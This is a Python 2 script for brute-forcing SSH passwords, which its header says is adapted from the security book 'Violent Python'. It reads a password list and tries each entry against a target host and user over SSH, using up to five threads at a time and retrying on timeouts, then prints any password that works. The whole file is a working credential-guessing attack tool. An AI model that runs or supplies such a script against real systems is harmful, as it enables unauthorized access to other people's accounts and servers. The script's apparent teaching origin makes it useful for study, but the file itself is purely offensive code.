#
# Pxssh driven SSH brute-forcing script.
# Based on:
#   Violent Python, by TJ O'Connor
#

import pxssh
import time
import optparse
from sys import argv, exit, stdout
from threading import *

MAX_CONNS = 5
CONN_LOCK = BoundedSemaphore(value=MAX_CONNS)
FOUND = False
FAILS = 0

def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before

def connect(host, user, password, release):
    global FOUND
    global FAILS
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '\n\n[+] Password found: ' + password + '\n\n'
        FOUND = True
        return s
    except Exception, e:
        if 'read_nonblocking' in str(e):
            FAILS += 1
            time.sleep(3)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            CONN_LOCK.release()

def main():

    if len(argv) < 4:
        print 'Usage: sshbrute.py host user passwords_list'
        return

    host = argv[1]
    user = argv[2]
    passwords = [ p.strip() for p in open(argv[3]).readlines()]

    i = 0
    for p in passwords:
        i += 1
        if FOUND:
            print '[*] Password found.'
            exit(0)
        if FAILS > 5:
            print '[!] Exiting: Too many socket timeouts'
            exit(0)

        CONN_LOCK.acquire()
        stdout.write('[?] Trying: "%s" %d/%d (%.2f%%)\r' % \
            (p, i, len(passwords), float(i)/len(passwords)))
        stdout.flush()
        t = Thread(target=connect, args=(host, user, p, True))
        t.start()

    stdout.write('\n')

if __name__ == '__main__':
    main()
